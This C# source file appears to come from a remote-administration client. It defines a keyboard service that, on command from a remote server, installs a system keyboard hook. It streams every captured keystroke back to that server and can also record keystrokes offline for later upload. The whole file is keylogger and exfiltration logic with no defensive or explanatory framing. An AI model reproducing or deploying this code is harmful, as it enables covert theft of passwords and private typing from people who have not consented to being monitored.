﻿using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.RemoteService.NewCore.Attributes;
using SiMay.RemoteService.NewCore.Extensions;
using SiMay.RemoteService.NewCore.ServiceSource;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;

namespace SiMay.RemoteService.NewCore.ControlService
{
    [ServiceKey("RemoteKeyboradJob")]
    public class KeyboardManager : ServiceManager, IServiceSource
    {
        private Keyboard _keyboard;
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);                    //this.OnMessage(session);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    if (_keyboard != null)
                    {
                        _keyboard.NotiyProc -= _keyboard_NotiyProc;
                        _keyboard.CloseHook();
                        _keyboard = null;
                    }
                    this._handlerBinder.Dispose();
                    break;
            }
        }
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_MAIN_OPEN_DLG,
                new OpenDialogPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey()
                });
        }

        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
        {
            if (_keyboard != null)
            {
                _keyboard.NotiyProc -= _keyboard_NotiyProc;
                _keyboard.CloseHook();
                _keyboard = null;
            }
            this.CloseSession();
        }

        [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
        public void ActionOffLineRecords(TcpSocketSaeaSession session)
            => _keyboard.StartOfflineRecords();

        [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
        public void SendOffLineRecord(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_KEYBOARD_OFFLINEFILE,
                _keyboard.GetOfflineRecord());
        }

        [PacketHandler(MessageHead.S_KEYBOARD_ONOPEN)]
        public void Init(TcpSocketSaeaSession session)
        {
            _keyboard = Keyboard.GetKeyboardInstance();
            _keyboard.NotiyProc += new Keyboard.KeyboardNotiyHandler(_keyboard_NotiyProc);
            _keyboard.Initialization();
        }

        private void _keyboard_NotiyProc(Keyboard.KeyboardHookEvent kevent, string key)
        {
            switch (kevent)
            {
                case Keyboard.KeyboardHookEvent.OpenSuccess:
                    break;

                case Keyboard.KeyboardHookEvent.OpenFail:
                    CloseSession();
                    break;

                case Keyboard.KeyboardHookEvent.Data:
                    SendAsyncToServer(MessageHead.C_KEYBOARD_DATA, key);
                    break;
            }
        }
    }
}